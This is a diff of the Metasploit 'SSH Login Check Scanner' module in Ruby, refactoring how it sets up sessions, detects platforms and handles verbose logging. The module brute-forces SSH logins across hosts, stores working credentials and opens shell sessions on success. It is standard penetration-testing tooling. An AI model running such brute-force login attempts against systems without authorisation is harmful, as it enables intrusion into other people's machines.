@@ -1,5 +1,5 @@
 ##
-# This module requires Metasploit: http://metasploit.com/download
+# This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
@@ -9,7 +9,6 @@ require 'metasploit/framework/login_scanner/ssh'
 require 'metasploit/framework/credential_collection'
 
 class MetasploitModule < Msf::Auxiliary
-
   include Msf::Auxiliary::AuthBrute
   include Msf::Auxiliary::Report
   include Msf::Auxiliary::CommandShell
@@ -18,19 +17,20 @@ class MetasploitModule < Msf::Auxiliary
 
   def initialize
     super(
-      'Name'        => 'SSH Login Check Scanner',
-      'Description' => %q{
+      'Name'           => 'SSH Login Check Scanner',
+      'Description'    => %q{
         This module will test ssh logins on a range of machines and
         report successful logins.  If you have loaded a database plugin
         and connected to a database this module will record successful
         logins and hosts so you can track your access.
       },
-      'Author'      => ['todb'],
+      'Author'         => ['todb'],
       'References'     =>
         [
           [ 'CVE', '1999-0502'] # Weak password
         ],
-      'License'     => MSF_LICENSE
+      'License'        => MSF_LICENSE,
+      'DefaultOptions' => {'VERBOSE' => false} # Disable annoying connect errors
     )
 
     register_options(
@@ -53,11 +53,11 @@ class MetasploitModule < Msf::Auxiliary
     datastore['RPORT']
   end
 
-  def session_setup(result, ssh_socket)
-    return unless ssh_socket
+  def session_setup(result, scanner)
+    return unless scanner.ssh_socket
 
     # Create a new session
-    conn = Net::SSH::CommandStream.new(ssh_socket, '/bin/sh', true)
+    conn = Net::SSH::CommandStream.new(scanner.ssh_socket)
 
     merge_me = {
       'USERPASS_FILE' => nil,
@@ -68,27 +68,10 @@ class MetasploitModule < Msf::Auxiliary
     }
     info = "#{proto_from_fullname} #{result.credential} (#{@ip}:#{rport})"
     s = start_session(self, info, merge_me, false, conn.lsock)
-    self.sockets.delete(ssh_socket.transport.socket)
+    self.sockets.delete(scanner.ssh_socket.transport.socket)
 
     # Set the session platform
-    case result.proof
-    when /Linux/
-      s.platform = "linux"
-    when /Darwin/
-      s.platform = "osx"
-    when /SunOS/
-      s.platform = "solaris"
-    when /BSD/
-      s.platform = "bsd"
-    when /HP-UX/
-      s.platform = "hpux"
-    when /AIX/
-      s.platform = "aix"
-    when /Win32|Windows/
-      s.platform = "windows"
-    when /Unknown command or computer name/
-      s.platform = "cisco-ios"
-    end
+    s.platform = scanner.get_platform(result.proof)
 
     s
   end
@@ -96,7 +79,6 @@ class MetasploitModule < Msf::Auxiliary
 
   def run_host(ip)
     @ip = ip
-    print_brute :ip => ip, :msg => "Starting bruteforce"
 
     cred_collection = Metasploit::Framework::CredentialCollection.new(
       blank_passwords: datastore['BLANK_PASSWORDS'],
@@ -133,22 +115,19 @@ class MetasploitModule < Msf::Auxiliary
       case result.status
       when Metasploit::Model::Login::Status::SUCCESSFUL
         print_brute :level => :good, :ip => ip, :msg => "Success: '#{result.credential}' '#{result.proof.to_s.gsub(/[\r\n\e\b\a]/, ' ')}'"
+        credential_data[:private_type] = :password
         credential_core = create_credential(credential_data)
         credential_data[:core] = credential_core
         create_credential_login(credential_data)
-        session_setup(result, scanner.ssh_socket)
+        session_setup(result, scanner)
         :next_user
       when Metasploit::Model::Login::Status::UNABLE_TO_CONNECT
-        if datastore['VERBOSE']
-          print_brute :level => :verror, :ip => ip, :msg => "Could not connect: #{result.proof}"
-        end
+        vprint_brute :level => :verror, :ip => ip, :msg => "Could not connect: #{result.proof}"
         scanner.ssh_socket.close if scanner.ssh_socket && !scanner.ssh_socket.closed?
         invalidate_login(credential_data)
         :abort
       when Metasploit::Model::Login::Status::INCORRECT
-        if datastore['VERBOSE']
-          print_brute :level => :verror, :ip => ip, :msg => "Failed: '#{result.credential}'"
-        end
+        vprint_brute :level => :verror, :ip => ip, :msg => "Failed: '#{result.credential}'"
         invalidate_login(credential_data)
         scanner.ssh_socket.close if scanner.ssh_socket && !scanner.ssh_socket.closed?
       else
@@ -157,5 +136,4 @@ class MetasploitModule < Msf::Auxiliary
       end
     end
   end
-
 end
